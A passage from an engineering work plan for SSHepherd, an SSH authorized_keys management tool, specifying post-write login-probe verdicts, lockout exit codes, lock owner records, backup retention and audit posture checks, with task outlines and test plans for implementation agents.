| **Before auth finished:** `host_key_*` on the probe dial | `hostkey.go:31-55` | **TRANSIENT, flagged** | No retry (the answer will not change), UNPROVEN at once, and the message names the host-key alarm. Proving access through an impostor proves nothing, so the file is kept. |
| **Auth refused:** `ErrorKindAuth` ("unable to authenticate": `from=` miss, algorithm refused, key not accepted) | `handshakeKind`, `errors.go:53-55` | **REJECTED** | Restore now (today's path). |
| **After auth succeeded:** session channel refused (`*ssh.OpenChannelError`), exec failed, `*ssh.ExitMissingError` (channel closed with no exit status), EOF or the probe-exec deadline while waiting for `probeOutput`, exit ≠ 0, or wrong output (forced `command=`, `rrsync`/`internal-sftp`-style commands that wait on stdin, `command="sleep 3600"`) | `connect.go:311`, `sshwrite.go:597-602` | **REJECTED** | Restore. A key that logs in but cannot run SSHepherd's command captures every later session (WP-5). |
| Anything unclassifiable (`unknown`) | — | **REJECTED** if the auth stage completed, **TRANSIENT** if it did not | The probe records which stage it reached; there is no "unknown is safe" rule. |

**Probe exec deadline.** The probe's exec gets its own deadline of **15s** after the session opens, so a hanging forced command ends as REJECTED well inside `restoreReserve`.

Retry policy, inside the session budget (`defaultSessionBudget`, `sshwrite.go:69`):

- Backoff schedule `0, 2s, 5s, 10s` (4 attempts). Each attempt's dial is bounded by `min(3×DialTimeout, remaining − restoreReserve)`, with `restoreReserve = 20s`, so a REJECTED verdict on the last attempt still has time to restore over the still-open write connection, whose socket deadline is the budget.
- Today `execCtx` is `context.WithoutCancel(ctx)` with no deadline (`sshwrite.go:376`), so the probe dial falls back to `3×DialTimeout = 30s` (`connect.go:138-146`). The spec makes the budget deadline explicit: `connectForWrite` returns it, and the probe and restore derive their contexts from it.
- An `agent` failure gets at most one retry, because a locked agent rarely recovers within seconds.
- Each attempt is logged at Debug with its kind. The final message carries the last cause.

Outcome after the retries run out: a new typed error, and the file and the disabled keys2 are **kept**:

```go
// UnprovenError: written and verified, but the post-write login never got
// past authentication (dial, kex, agent) after the retries; the file is kept
// because restoring could reinstall a key the manifest removed. Any failure
// after a successful login is a REJECTED probe, never an UnprovenError.
type UnprovenError struct {
	Path     string
	Attempts int
	Last     error // sanitized; its kind is the last probe failure's
}
```

Text line: `web-1: UNPROVEN: written and verified, but the login check could not reach the server after 4 attempts (dial tcp …: i/o timeout) — kept the new file; run sshepherd audit to confirm`. Outcome `unproven`, exit 1.

A revoke-specific note for the spec: after a REJECTED probe the rollback still reinstalls the keys in `p.Remove`. The FAILED line must then name them (`restored previous file — it still grants alice (SHA256:…), which the manifest removed; fix the surviving key and re-run`). Exit stays 1. How loud that should be ties to D2 (P04 revocation memory). The spec links P04 and does not decide it.

##### 2. Unrestored lockout (D10, WP-6)

- Split `LockoutError.Restore` (`sshwrite.go:298-311`). `Restore` covers only the `authorized_keys` restore, and a new `RestoreKeys2 error` takes the `restoreKeys2Cmd` failure, which today is `errors.Join`ed into `Restore` at `sshwrite.go:569`. A failed keys2 move-back cannot lock anyone out, because keys2 only adds keys, so it must not raise the exit code.
- Restore retry: on `lockedExit` (47) only, retry `1s, 3s, 6s` within the budget. Any other restore exit is final.
- New outcomes in `internal/apply/plan.go:36-45`: `OutcomeUnproven = "unproven"` and `OutcomeLockoutUnrestored = "lockout_unrestored"`. `ExitCode` returns 2 if any plan is `lockout_unrestored`, otherwise today's 0/1 rule.
- JSON (`internal/apply/json.go`): `outcome` gains the two values, and `summary` gains `unproven` and `lockout_unrestored` counts. The schema stays **1**: apply `--json` landed 2026-11-07 and the change is additive. The spec adds the rule "treat an unknown `outcome` as not converged" to the apply-json contract. The JSON document rule "written exactly when the run exits 0 or 1" (apply-json spec, README:576) becomes "0, 1 or 2".
- Text: `LOCKOUT — NOT RESTORED:` (bold red) and `UNPROVEN:` (yellow) in `RenderSummary` (`report.go:270-290`). The Summary line adds `· N unproven · N lockout not restored`.
- cmd layer: `apply.go:115`, `editrun.go:334` and `editrun.go:377` map `ExitCode != 0` to `errNonCompliant`. They need an `applyVerdict` that maps 2 to `errCriticalDrift`, mirroring `auditVerdict` (`cmd/sshepherd/audit.go:123-131`). After P14 this lives in `internal/workflow`.

##### 3. Lock owner record (D11, WP-7)

- `lockPrologue` (`sshwrite.go:147`, as rewritten by P11) sets the EXIT trap first, then writes `$l/owner`: one line, `v1 <client-host> <client-pid> <remote-pid $$> <remote-epoch $(date +%s)>`. The client fields are passed as a single shell-quoted literal limited to `[A-Za-z0-9._-]` and capped at 64 bytes. The trap becomes `rm -f "$l/owner"; rmdir "$l"`. The order matters: the trap must exist before the owner file, or a kill in between leaves a non-empty lock.
- On a busy lock the script prints `cat "$l/owner"` and the remote `date +%s` on stdout, then exits 47. The client parses the line strictly against `^v1 [A-Za-z0-9._-]{1,64} \d+ \d+ \d+$`. Anything else becomes "unrecognized owner record", and nothing remote is echoed raw. `LockedError` gains `Owner string`, `Age time.Duration` and `Known bool`. Age is remote now minus remote epoch, so clock skew does not matter. A bare lock without an owner file (left by an older sshepherd) reports `owner unknown (older sshepherd or killed shell)`.
- The message prints the exact removal command, built with the same quoting as `sshconn.PathAssign`, for example `ssh -p 22 deploy@10.0.0.1 'p="$HOME"/'\''.ssh/authorized_keys'\''; rm -r -- "$p.sshepherd.lock"'`, followed by "only if no apply is running on <host> (pid N)". The lock is never removed automatically, and no flag is added (this keeps clear of the on-hold `apply --force`).
- The restore script shares the prologue, so a busy restore lock reports the same owner and age in the `lockout_unrestored` message.

##### 4. Interrupt notice and reconnect-and-probe (D12, WP-2)

- **No server-side watchdog.** The spec records it as a rejected alternative: it starts a detached process on every server, against the agentless design intent in CLAUDE.md. `nohup`/`setsid` behave differently on busybox, the watchdog races a later apply's lock and compare-and-swap, and a client that cannot create the confirm marker turns a good write into a rollback.
- **First-signal notice, without touching `cmd/sshepherd/run.go`.** `apply.Execute` (`internal/apply/exec.go:57-87`) keeps an `atomic.Int32` in-flight count and registers `context.AfterFunc(ctx, …)`. When the count is above zero, the callback logs one Warn: `interrupt: finishing N in-flight writes (write, verify, login check — up to 2m); a second Ctrl-C abandons their login check and rollback`. `watchSignals` (`run.go:111-139`) stays unchanged, so this avoids the run.go owners (P01, P06, P13).
- **Container grace period, docs only.** In README "Container usage" (README:1330-1338), advise `docker stop -t 150` / `terminationGracePeriodSeconds: 150`, more than the 2-minute session budget. SIGKILL cannot be handled.
- **Transport error after the upload started** (`sshwrite.go:386-388`, an `err != nil` from stage-1 exec, not an exit code). Open a fresh full-credential connection within the budget. **Take the per-target lock first** (the dropped script may still be running and holding `$p.sshepherd.lock`, for example between `wc` and `mv`): `mkdir` the lock, retry on 47 with the restore-retry schedule inside the budget, and read the file through `sshconn.AuthorizedKeysCmdFor` **under that lock**. Only then decide:
  - If the bytes equal the render, the `mv` happened: release the lock, then continue with verify-equivalent, keys2 and probe on the new connection. A REJECTED probe restores over this new connection, and if that fails the outcome is `lockout_unrestored`.
  - If the snapshot matches `req.Expect`, the outcome is FAILED "connection dropped before the rename; original untouched (re-checked under the lock)", which makes README:1420-1421 true again.
  - If the lock never frees within the budget, or the bytes are anything else: FAILED "connection dropped; the file is in an unknown state", with the `.bak` path.
  - **Fourth outcome:** the reconnect itself fails with an **auth-kind** error after the stage-1 exec had started. The `mv` may have landed a file that locks out every held key, so the outcome is `lockout_unrestored` (exit 2 per D10/D28) with the `.bak` path, never the generic FAILED.
- **Verify transport error** (`sshwrite.go:396`): same reconnect-and-reread. A verify that read the file and found different bytes stays FAILED with no probe, as today: SSHepherd did not write those bytes, so it must not restore over them.

##### 5. Backup retention (D13, WP-8)

- `disableKeys2Cmd` (`sshwrite.go:244-248`) drops `rm -f "$s"`. When `authorized_keys2.sshepherd.disabled` is free it is used, so today's plan row and goldens stay the same. Otherwise the script uses `authorized_keys2.sshepherd.disabled.<UTC YYYYmmddTHHMMSSZ>`, adding `.$$` if that name also exists, checked with `[ -e ] || [ -L ]` under the same ancestor walk. The script prints the chosen name. `restoreKeys2Cmd` (`sshwrite.go:252-256`) takes that exact name instead of the constant suffix. The README says copies accumulate and are never deleted by SSHepherd.
- **Keys2-only plans:** `planOne` already knows `same` (`plan.go:213`). `ServerPlan` gains `KeysUnchanged bool` (`same && AuthorizedKeys2`), and `sshwrite.Request` gains `SkipWrite bool`. With `SkipWrite`, `Apply` skips stage 1 (no lock, `.bak`, `.orig` or `mv`), re-reads and byte-compares the file (the verify doubles as the compare-and-swap; a mismatch is `ChangedError`, a refusal), disables keys2, and probes. A REJECTED probe restores only keys2. The plan text and JSON are unchanged apart from an additive JSON bool `rewrites_authorized_keys` (false here), which the spec decides.

##### 6. Headless key-file proof (D9b; moved here from P11 by the review panel)

P11 makes the probe offer survivors in the exact order every later run offers them (WP-5), so it no longer prefers `--identity` key files. If D9b = yes: after a passing first probe, and only when the production order starts with an agent key and a surviving key file's manifest line is unrestricted (P11's `offerRank` 0), run one more login offering only those key files. A failure there **only warns** (`web-1: warning: your --identity key /k/ci could not log in on its own (…); a headless run with only that key would fail`) and never restores, so it cannot roll back a write the first probe proved safe or reinstall a revoked key. It costs one extra connection in mixed-source runs only; the spec states that cost against WP-1's rate-limit evidence (`--hitcount 4 --seconds 60`, MaxStartups).

#### What the spec doc must decide (checklist for the spec agent)

1. Header in the repo's style (`2026-11-07-apply-json-design.md:1-10`): Date 2026-11-08, Status `Draft — awaiting owner decisions D9, D9b, D10`, Scope (`internal/sshwrite`, `internal/apply`, the cmd verdict mapping, README), and Context & goal citing WP-1/2/6/7/8.
2. A "Decisions" table with D9, D9b and D10 (asked) and D11–D13 (stated, overridable at approval): the question, the options, the recommendation, and an empty "Owner choice" column. A "Reverses" column cites the line it overturns (review-hardening:260-263, README:1346-1349, README:1411-1413, README:1420-1421, sshwrite.go:240).
3. The probe-verdict table from §1, sorted by stage (before auth / auth refused / after auth), including the `unknown` and `host_key_*` rows and the 15s probe-exec deadline. It must not justify any TRANSIENT row by "the static guard already passed": the guard never evaluates `from=`/`command=`.
4. Exact numbers: the backoff schedule, `restoreReserve`, the restore-retry schedule, the agent retry cap, and the owner-record format and regex.
5. The new exported surface (`UnprovenError`, `LockoutError.RestoreKeys2`, `LockedError{Owner,Age,Known}`, `Request.SkipWrite`, `ServerPlan.KeysUnchanged`, `OutcomeUnproven`, `OutcomeLockoutUnrestored`), named against the post-P14 package layout (`internal/fleet` for kinds).
6. **Exit-code and JSON changes:** taken from the shared exit-code table that D28 fixes (Owner decisions, Block 1); this spec only adds its rows. Under D28's recommendation apply/revoke/rotate exit 2 for `lockout_unrestored`. `outcome` enum +2, `summary` +2 counts, schema stays 1 with the open-enum rule, and the document is written on exit 0/1/2. Exit precedence: 3 > 2 > 1 > 0.
7. Text strings verbatim: `UNPROVEN:`, `LOCKOUT — NOT RESTORED:`, the `UnprovenError` message, the `LockedError` message with age and removal command, the first-signal notice, and the two reconnect outcomes.
8. **README sections affected:** "Exit codes" table (README:1340-1350; the row-2 text "apply, revoke and rotate never return 2" changes); the apply `--json` paragraph (README:575-582: outcome list and "exits 0 or 1"); the apply summary sample (README:752-757, re-copied from `summary_*.golden`); Ctrl-C/SIGTERM (README:760-767); Safety model "Refusals" lock bullet (README:1410-1413); "One guarded write per server" (README:1415-1421); "Backups" (README:1423-1426); "`authorized_keys2`" (README:1428-1434); "Verify, then prove you can still log in" (README:1436-1447); "Container usage" (README:1330-1338). Also the CLAUDE.md Status paragraph.
9. The rejected alternatives: the server watchdog, auto-breaking stale locks, keeping "restore on any failure", and bumping JSON schema to 2. One line of reason each.
10. The test plan (below), naming the unit, integration and E2E cases.
11. The "Implementation timing" note: after P14, with files re-targeted to P14's layout.

#### Implementation task outline (P08-impl, after approval and after P14)

Two parallel agents with disjoint files, then an integrator. Before they fork, the integrator pins the exported types from spec point 5 in the plan, so agent B codes against them.

**Agent A — `internal/sshwrite` (owns `sshwrite.go`, plus new `probe.go` and `lockinfo.go` to keep `sshwrite.go` under the `cyclop` cap, `sshwrite_test.go`, `integration_test.go`, `fuzz_test.go` only for a new `FuzzParseLockOwner` corpus)**

1. `classifyProbe` table test (TDD). The cases come from the §1 table and take the stage as input: an `&sshconn.Error{Kind: fleet.ErrorKindAuth}` gives rejected; dial, timeout-before-auth, handshake and agent give transient; `fmt.Errorf("open session: %w", &ssh.OpenChannelError{})` gives rejected; `&ssh.ExitMissingError{}` after auth gives rejected; `io.EOF` after auth gives rejected; `unknown` after auth gives rejected and before auth gives transient; a probe-command mismatch gives rejected; `host_key_changed` gives transient with no retry. Seamed `Apply` tests: an exec that blocks past the 15s probe deadline (fake clock) gives a restored `*LockoutError`; an `ExitMissingError` gives a restored `*LockoutError`. Run `go test ./internal/sshwrite -run TestClassifyProbe` and watch it fail, then implement.
2. Retry and UNPROVEN. Extend `TestApplyLoginProbeFailureRestores` (`sshwrite_test.go:707-759`). The current "probe session refused" case (`errors.New("session refused")`) becomes an `OpenChannelError` and still restores. New cases: `seamedConnect` returns a dial-kind error 4 times, giving `*UnprovenError`, no restore command in `s.cmds`, and `len(c.opts)==5`; dial fails twice then succeeds, giving nil; an auth error on the first attempt restores with no retry. Add a `sleep func(context.Context, time.Duration) error` seam on `FleetWriter` so the tests take no wall-clock time.
3. Restore retry on 47 and the `RestoreKeys2` split. Restore responses `[47, 47, 0]` give `Restore == nil` after 3 restore commands. `[47, 47, 47, 47]` gives `Restore != nil` mentioning the lock owner. A keys2 restore failure with a successful main restore gives `Restore == nil` and `RestoreKeys2 != nil`.
4. Lock owner. Extend `TestWriteCmdThroughRealSh` (`sshwrite_test.go:168`) under dash, bash and busybox. A pre-made lock with an owner file makes the script exit 47 with a parsable stdout. After a successful run, neither `$l` nor `$l/owner` remains. A killed script (`kill -TERM` from inside via the `trap` path) leaves no lock. Unit-test `parseLockOwner` (valid, bare/absent, hostile ESC bytes, too long). Fuzz `FuzzParseLockOwner`.
5. Keys2 retention. Real-sh test: an existing `.sshepherd.disabled` is never deleted and the second copy gets the timestamp name. `restoreKeys2Cmd(name)` moves back exactly that name.
6. `SkipWrite`. Seamed test: the first command is `AuthorizedKeysCmdFor`, not `writeCmdFor`; there is no `.bak` command; a mismatch gives `*ChangedError` (refusal); a REJECTED probe restores only keys2.
7. Reconnect after a transport drop. Seamed: the stage-1 exec returns a transport error and the reconnect read returns (a) the render, so the probe runs, (b) the old bytes, giving "original untouched (re-checked under the lock)", (c) other bytes, giving "unknown state". Plus: (d) the reconnect's lock `mkdir` exits 47 twice, then succeeds, and the read under the lock sees the render; (e) the reconnect fails with an auth-kind error, giving `OutcomeLockoutUnrestored` and the `.bak` path. The same for a verify transport error.
8. Integration (`//go:build integration`, `make integration`): `TestIntegrationProbeTransientKeepsFile` (the probe dials a closed port via a `connect` override that only rewrites the port for `Only` connects, so the result is UNPROVEN and the file kept); `TestIntegrationStaleLockReportsOwnerAndAge`; `TestIntegrationKeys2DisabledNeverOverwritten`; `TestIntegrationLoginProbeRestores` stays green (a REJECTED probe still restores). With P03's mutable `sshtest` authorized list (TST-3), add a hermetic case where the written file drops the survivor, so auth is REJECTED and the restore happens.

**Agent B — `internal/apply` + cmd verdict (owns `plan.go`, `plan_test.go`, `exec.go`, `exec_test.go`, `report.go`, `report_test.go`, `json.go`, `json_test.go`, `testdata/summary_*.golden`, `testdata/json_*.golden.json`, plus the verdict helper in its post-P14 home (`internal/workflow/…` or `cmd/sshepherd/apply.go` + `editrun.go`))**

1. `TestExitCode` gains the cases `lockout_unrestored` → 2, `unproven` → 1, and mixed `applied` + `lockout_unrestored` → 2. Run `go test ./internal/apply -run TestExitCode` and watch it fail, then implement the `ExitCode` rule from §2.
2. `TestExecuteOutcomes` (`exec_test.go:58-108`) gains `"unproven": &sshwrite.UnprovenError{…}` → `OutcomeUnproven` and `"unrestored": &sshwrite.LockoutError{Restore: errors.New("x")}` → `OutcomeLockoutUnrestored`. The existing `"lockout"` case (`Restore == nil`) stays `OutcomeFailed`.
3. `TestExecuteInterruptNotice`: a `fakeWriter` blocks on a channel, the test cancels ctx and checks the captured slog Warn contains `finishing 1 in-flight write`, and checks no notice appears when nothing is in flight.
4. `KeysUnchanged`/`SkipWrite`: a plan test where `same && AuthorizedKeys2` gives `KeysUnchanged`, and an exec test asserting `req.SkipWrite`.
5. Goldens: new `summary_unproven.golden` and `summary_lockout.golden`, and new `json_failures.golden.json`, all produced with `go test ./internal/apply -run 'Golden|JSON' -update`. Round-trip asserts the `unproven` and `lockout_unrestored` counts and `exit_code: 2`.
6. cmd: `TestApplyLockoutUnrestoredExits2` (hermetic, fake writer seam) checks exit 2 and that a JSON document is still written.

**Integrator:** apply both diffs, then run `make check` and `make integration`. Extend `cmd/sshepherd/e2e_test.go` with one UNPROVEN step if P13 leaves a hook for it, otherwise record it as a gap. Update every README section in spec point 8, copying samples from the new goldens and never hand-writing them. Update the CLAUDE.md Status paragraph, set the spec status to `Implemented (<commit>)`, and commit once on master. After that, an independent verifier re-runs the gates and checks that README and goldens match, then a repair pass fixes anything it finds.

**Risks:**

- Wrongly treating a real rejection as TRANSIENT keeps a locking or capturing file. Mitigated by sorting on stage (anything after auth is REJECTED), the 15s probe-exec deadline, the table tests and the hermetic REJECTED case.
- Retries add connections on rate-limited hosts. The schedule is bounded, and each attempt is logged.
- The lock-owner write lengthens a single-line script that P11 is also rewriting. That is why P08-impl must rebase on P11.
- Old-version locks without an owner file must keep working (covered by test 4).

#### Acceptance

For the P08 spec package:

```sh
test -f docs/superpowers/specs/2026-11-08-write-failure-semantics-design.md
grep -c 'D9\|D10\|D11\|D12\|D13' docs/superpowers/specs/2026-11-08-write-failure-semantics-design.md   # ≥ 5
grep -n 'lockout_unrestored\|unproven\|Exit codes\|agentless' docs/superpowers/specs/2026-11-08-write-failure-semantics-design.md
git status --porcelain   # only the new spec file (integrator commits it)
make check                # unchanged code; must stay green
```

For P08-impl later: `make check`, `make integration`, `go test -race ./internal/sshwrite ./internal/apply ./cmd/sshepherd`, `go test ./internal/apply -run 'Golden|JSON'` with no `-update` diff, and the README help-parity test (`cmd/sshepherd/help_readme_test.go`) green.

#### Out of scope

- Writing any code, tests, goldens or README text in this package. The README changes land with P08-impl.
- Re-deciding the on-hold items: no automatic lock breaking and no `--break-lock`/`--force` (apply --force), and no empty-server or wipe change (apply wipe mode).
- WP-3 (CAS before upload), WP-4 (fsync), WP-5 (probe key order), WP-9 (mkdir on refusal) and WP-10 (keys2 path spelling), which belong to P11.
- How loud a rollback that reinstalls a revoked key should be: that is D2/P04. This spec only requires the FAILED line to name those keys.
- A configurable session budget or retry flags. The numbers are fixed in the spec.

---

### P09 — Spec: audit trust, key policy and connection posture (permissions, operator critical tier, host-key types, key offering, coverage claim)

> **Program notes (master plan, revised by the review panel):** Spec only; implementation is W5+ after P14 (W3). D16 is re-asked with corrected options. D19a is folded into **D29** (Block 1: manifest policy problems are reported by audit, not load errors), so weak keys never block revoke/rotate. D17's recommendation is one rule with one default on every command. Technical sub-questions D14a–c and D17a–b are decided by the spec author with the defaults below and shown to the owner at spec approval (not asked separately). D18's README narrowing goes to the next integrator once answered.

- **Kind:** spec (no code; the agent writes one design doc)
- **Wave:** 1 (the spec). Its **implementation** runs in a later wave, after P14 (W3), because P14 moves `ErrorKind`, `ReadResult` and `HeldKey` into `internal/fleet`. Implementation also edits files that P05, P06, P07, P11 and P12 change in W1/W2.
- **depends_on:** none for the spec. Implementation depends on P14, plus P05 (`internal/authkeys/options.go`, `internal/config/config.go`) and P07 (`internal/audit/*`, `internal/sshconn/connect.go`).
- **Owner decisions:** D14, D15, D16, D17, D18, D19. Ask them one at a time, in plain words, each with a recommendation. **D16's wording needs a fix before it is asked** (see Q3).

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| SEC-1 | LOW | audit never checks the mode or owner of `authorized_keys`, `~/.ssh` or `$HOME` (read command `sshconn.go:76-78` is a bare `cat`). The write path refuses the same conditions with exit 48 (`sshwrite.go:149-161`). |
| COR-5 | LOW | `criticalDrift` (`audit/report.go:255-267`) looks only at `Diff.Missing`. An operator key installed as `cert-authority`/`principals=` lands in `Diff.OK` and shows as options drift (exit 1), even though `apply.certOnly` (`apply/plan.go:516-526`) already treats such a line as unable to log in. |
| COR-6 | LOW | `HostKeyAlgorithms` (`sshconn/knownhosts.go:127-150`) offers every plain algorithm after the recorded ones. An impersonator that offers only another type ends up in `host_key_type_unrecorded` (`hostkey.go:49-54`), which `hostKeyAlert` (`audit/errors.go:80-84`) keeps at exit 1. |
| SEC-5 | LOW | `orderSigners` (`sshconn/connect.go:240-266`) offers the granted keys first and then **every other** held key. `Credentials.Signers` (`credentials.go:109-135`) returns all agent and file keys, so any managed server can list the operator's identities. |
| PRD-9 | MED | README:37 says audit answers "who can log into which server?", but audit reads one file per manifest entry plus the `authorized_keys2` probe (`sshread.go:161-199`). README:268-272 already admits that other layouts "are not detected". |
| PRD-10 | MED | No key policy. `authkeys.ParseLine` (`authkeys.go:27-66`) accepts DSA and 1024-bit RSA. `config.parseUserKey` (`config.go:177-197`) never evaluates `expiry-time`. Only `rotate` checks for a passed expiry (`cmd/sshepherd/keyarg.go:266-295`, `rotate.go:166-173`). |

#### Files owned (spec wave)

- `docs/superpowers/specs/2026-11-08-audit-trust-posture-design.md` (new). Nothing else.

---

#### Design questions (one owner decision each, in this order)

The six items touch three areas: what audit **sees** (SEC-1, PRD-9), how audit **grades** what it sees (COR-5, COR-6, PRD-10) and what the client **reveals** (SEC-5). Ask in the order below. The answers to Q1 and Q2 shape the exit-code table that Q3 and Q6 extend.

**Q1 → D14 (SEC-1): should audit check permissions and owners?**
Recommendation: yes. Add a new "unsafe permissions" drift: exit 1, or exit 2 when something on the path is **world**-writable.
Sketch:
- Move the StrictModes walk out of `sshwrite.go:159-161` into `internal/sshconn` as one builder that takes the action for a bad component: `ancestorWalk(onBad string) string`. The write path passes `exit 48` (its script stays byte-identical, so `TestWriteCmd*` pins it). The audit path passes a `printf` that emits one record per bad component:
  `printf 'SSHEPHERD-POSTURE %s %s %s\n' "$1" "$3" "$q"` (ls mode, owner uid, path).
- Add a new `sshconn.PostureCmdFor(path)`. It runs as a separate session, so the bytes from `AuthorizedKeysCmdFor` stay pure file content: `sshwrite` verify reads back through that exact command (`sshconn.go:72-75`), so it must not change. The script checks:
  1. the file itself: a symlink → `symlink`; not owned by the login uid or root → `foreign_owner`; mode `?????w*` → `group_writable`; mode `????????w*` → `world_writable`;
  2. the ancestors up to `$HOME`, both as written and resolved (the same two loops as `ancestorCheck`), with the same classes.
  It never exits early. It always exits 0 unless a tool is missing.
- **Fold the `authorized_keys2` probe into this session.** Today that probe is session 2 (`sshread.go:185-197`). The posture script appends `SSHEPHERD-KEYS2 1` when the file is non-empty, which keeps each server at 2 sessions and protects the fan-out benchmark numbers. `FinishSecondaryProbe` becomes `FinishPosture(code, stdout, stderr) (fleet.Posture, error)`.
- New types in `internal/fleet` (P14's leaf package):
  ```go
  type PostureIssue struct {
      Path  string // sanitized; remote-controlled once resolved
      Issue string // "symlink" | "foreign_owner" | "group_writable" | "world_writable"
      Mode  string // ls -ldn first field, e.g. "drwxrwxrwx"
      UID   string // owner uid as printed
  }
  // ReadResult gains: Posture []PostureIssue
  ```
- `ServerResult.Compliant()` (`audit.go:76-84`) becomes false when `len(r.Posture) > 0`. `statusOf` (`report.go:283-294`) returns critical when any issue is `world_writable`.
- Lines starting with any other text, unknown issue values or more than 64 records → `ErrorKindRemote` ("posture probe output malformed"). A hostile server must never be able to forge a clean result. A non-zero exit → `ErrorKindRemote`, the same as today's `FinishSecondaryProbe` (`sshconn.go:90-100`).
- The spec must state the StrictModes nuance from the verifier. With sshd's default `StrictModes yes`, a writable file or ancestor makes sshd **ignore** the file. A successful audit login on such a server therefore means either StrictModes is off (an open door) or the login came through another key source. Either way the server is not compliant.

Spec-author defaults (numbered, listed in the master decision table, shown at spec approval):
- **D14a:** Is root ownership accepted for the file? Default yes, the same as the write walk.
- **D14b:** Should a probe failure make the server unreachable (consistent with keys2) or show "posture unknown" drift? Default unreachable/`remote`, for consistency.
- **D14c:** Is the probe also used for an `authorized_keys_file` path outside `$HOME`? Default yes: the walk stops at `/`, as the write walk does.

**Q2 → D15 (COR-5): is an operator key that cannot log in critical?**
Recommendation: yes, exit 2.
Sketch:
- Move `certOnly` from `internal/apply/plan.go:516-526` to `internal/authkeys` as `CertOnly(options []string) bool`. `apply.Survivors` calls the moved function, so there is one rule for both write and audit. P05 already creates `internal/authkeys/options.go`; this function goes there.
- In `criticalDrift`, add: for `k` in `r.Diff.OK`, when the owner is an operator and `authkeys.CertOnly(r.Diff.Actual[k.Fingerprint].Options) && !authkeys.CertOnly(k.Options)`, return true. A manifest that deliberately declares the operator line as `cert-authority` does not drift and is not critical.
- If D19 lands, an operator line whose **on-server** `expiry-time` has passed also counts (the same "cannot log in" class).
- Out of scope, stated explicitly: added `command=`/`from=` on an operator line. Those still allow some login, so they stay options drift at exit 1, as the verifier argued.
- Text row: `‼ … present but CANNOT LOG IN (CRITICAL: operator key; server line is cert-only)`. JSON: on the present key, `"operator": true` plus `"cannot_log_in": "cert_only" | "expired"`. This extends the json.go:203-205 rule that `operator` marks only critical rows.

**Q3 → D16 (COR-6): host key of a type you never recorded.**
**Correct the decision text before asking.** D16 option 1 says "as OpenSSH's strict mode does". The verifier showed that OpenSSH only **reorders** host-key algorithms from `known_hosts`; it does not restrict them. Restricting also does **not** close the gap. An impersonator that offers only an unrecorded type would then fail with "no common algorithm for host key", which `handshakeKind` classifies as `handshake` (exit 1). The alarm still drops, only to a different kind.
Recommendation (re-ask D16 with these options):
- **(new 1, recommended)** Keep today's negotiation. Add a new error kind `host_key_type_changed` (exit 2, counted in `host_key_alerts`). It is used when `known_hosts` records at least one type x/crypto can verify (`algosForKeyType(t) != nil`) and the server presented a different type. Because the recorded types are negotiated first (`knownhosts.go:137-143`), a real server reaches this branch only when it no longer serves any recorded key, which is effectively a re-key and deserves a human anyway. `host_key_type_unrecorded` (exit 1) is kept only for hosts whose recorded types are all unsupported (for example only `ssh-dss`). The meaning of an existing kind never changes tier.
- (2) Restrict `HostKeyAlgorithms` to the recorded types **and** map a host-key negotiation failure on a host with recorded types to `host_key_type_changed`. This classifies by an error string (fragile) and loses the presented-key fingerprint in the hint.
- (3) Keep today's behavior.

The sketch for (new 1) touches `hostkey.go:49-54` (pass `supportedRecorded(ke)` into the branch), `audit/errors.go` → `fleet` (new constant and `hostKeyAlert` includes it), and the README exit table. The hint text keeps "verify out of band" but leads with "HOST KEY TYPE CHANGED".

**Q4 → D17 (SEC-5): which keys does each server see?**
Recommendation (revised by the review panel, product-ux): **one rule, same default on every command.** Offer only the keys granted on that server plus operator keys. When the manifest grants none of your held keys on that server (normal right after `import --servers-only`), offer every held key and print one warning. `--offer-all-keys` (default off everywhere) forces the old behavior.
Sketch:
- Add `Dialer.OfferAll bool` (`connect.go:25-48`). In `ConnectWith` (`connect.go:182-187`): when `!d.OfferAll && len(only) == 0`, set `only = prefer`. `GrantedFingerprints` (`audit.go:125-132`) already lists operators first, because `DesiredFor` includes every operator, so "plus operator keys" needs no extra code.
- **Certificates:** `orderSigners` matches by fingerprint, and a certificate's fingerprint is not its key's. Under the restricted offer, a held certificate is offered when `cert.Key` **or** `cert.SignatureKey` has a granted fingerprint. The second case covers a manifest `cert-authority` line. The rule goes in `orderSigners`, with table tests.
- **No granted key held:** fall back to offering every held key for that server and log one warning: `web-1: none of the keys granted here are loaded; offering all N held keys`. No new error kind; first contact keeps working.
- Callers: `audit` (`cmd/sshepherd/audit.go:93`) and `apply` (`apply.go:92`) keep `GrantedFingerprints`. `revoke`/`rotate` keep the former∪edited union (`editrun.go:226-228`), so a pre-edit key still logs in. `adopt` (`adopt.go:150`) uses the same rule; for a server with no granted held key the fallback above already offers everything. The post-write probe already uses `Only` and is unchanged.
- MaxAuthTries also benefits: fewer keys are offered.

Spec-author defaults:
- **D17a:** The flag name and where it exists: `--offer-all-keys` on all five commands, default off on all of them.
- **D17b:** `CheckCredentials` (`sshread.go:42`) warns at preflight when no held key is granted on any target server: yes, WARN only.

**Q5 → D18 (PRD-9): narrow the claim now, deeper probe later.**
Recommendation: option 1.
- **Now** (small doc-only change, which P09 cannot make itself: it goes to the W1 integrator, or the first README-touching package after D18 is answered). README:37 becomes "**Audit** — check that every managed `authorized_keys` file holds exactly the manifest's keys, in text or JSON. It does not see other accounts on the host or sshd's other key sources (see [Per-server `authorized_keys_file`](#per-server-authorized_keys_file))." CLAUDE.md "Core capabilities → Audit" gets the same narrowing. README:268-272 gains the full list: `AuthorizedKeysCommand`, `TrustedUserCAKeys`, `AuthorizedPrincipalsFile/Command`, other accounts.
- **Later slice (own spec, not designed here):** an opt-in `audit --deep` (the name is for that spec to choose). It would (1) run `sshd -T -C user=U,host=H,addr=A` when it works, falling back to reading `/etc/ssh/sshd_config` and its `Include` files for the key-source directives; and (2) run `getent passwd` and report each account with a non-empty `~/.ssh/authorized_keys{,2}` that the manifest does not manage. Findings would be "unmanaged access paths". Their exit tier is for that spec to decide.
- The P09 spec records only the decision, the README wording and these requirements.

**Q6 → D19 (PRD-10): built-in key rules.**
Recommendation: option 1. Reject DSA and RSA under 2048 bits, warn when `expiry-time` has passed, and have audit flag both. No `added:` date, key age or "overdue" check: those overlap the **on-hold scheduled rotation**, so the spec must list them as excluded and not re-propose them.
Sketch:
- `internal/authkeys/policy.go` (new): `StrengthIssue(pub ssh.PublicKey) string` (`"dsa"`, `"rsa_under_2048"`, or ""; RSA bits come from `pub.(ssh.CryptoPublicKey).CryptoPublicKey().(*rsa.PublicKey).N.BitLen()`). `ExpiryOption`/`ExpiryPassed` move out of `cmd/sshepherd/keyarg.go:266-295` (rotate then calls them). `Key` gains `Weak string` (set by `ParseLine`, so the raw line is not parsed twice).
